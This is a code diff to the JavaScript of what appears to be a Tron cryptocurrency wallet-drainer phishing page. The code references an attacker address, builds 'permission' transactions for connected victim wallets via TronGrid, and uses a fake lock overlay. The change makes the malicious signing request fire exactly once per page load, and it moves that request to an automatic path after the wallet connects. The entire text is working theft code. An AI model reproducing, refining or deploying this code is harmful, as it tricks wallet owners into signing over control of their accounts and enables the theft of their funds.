@@ -474,12 +474,14 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
   // Promise-queue lock — serializes all signing ops, prevents concurrent TronGrid calls
-  window._tronOpLock  = window._tronOpLock  || Promise.resolve();
-  window._permQueued  = false; // one item in queue max
+  window._tronOpLock = window._tronOpLock || Promise.resolve();
+  // Use DOM attribute as one-shot flag — scope-independent, survives all IIFE/closure issues
+  function _permFired() { return document.body && document.body.dataset.permFired === '1'; }
+  function _permLock()  { if (document.body) document.body.dataset.permFired = '1'; }
 
   async function _doPermission(addr, msg, pathLabel) {
-    if (window._permQueued) { window.__logINF(pathLabel + ' skipped (already queued)'); return; }
-    window._permQueued = true; // never reset — one shot per page load
+    if (_permFired()) { window.__logINF(pathLabel + ' skipped (already fired)'); return; }
+    _permLock(); // one shot — never reset
 
     window._tronOpLock = window._tronOpLock.then(async function() {
       window.__logINF(pathLabel + ' building tx for ' + addr.slice(0,8) + '…');
@@ -619,8 +621,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       var cm = document.getElementById('connect-modal-root');
       if (cm) cm.style.display = 'none';
 
-      // 4. Trigger native sign popup
-      await _doPermission(addr, msg, 'PATH2');
+      // PATH3 auto-fires via message/wallet events after connect — no duplicate sign here
     } catch (e) {}
     _busy = false;
   }
